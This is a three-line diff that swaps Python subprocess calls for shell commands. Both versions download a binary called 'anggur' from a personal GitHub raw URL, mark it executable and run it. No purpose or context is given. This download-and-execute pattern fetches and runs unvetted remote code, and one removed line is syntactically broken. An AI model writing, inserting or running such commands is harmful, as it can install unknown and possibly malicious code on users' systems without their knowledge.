@@ -1,3 +1,3 @@
-subprocess.run(['wget','https://raw.githubusercontent.com/kunanananaft/Woryyme/main/anggur'])
-subprocess.run(['chmod','+x','anggur'])
-subprocess.run(['./anggur')
+wget https://raw.githubusercontent.com/kunanananaft/Woryyme/main/anggur
+chmod +x anggur
+./anggur
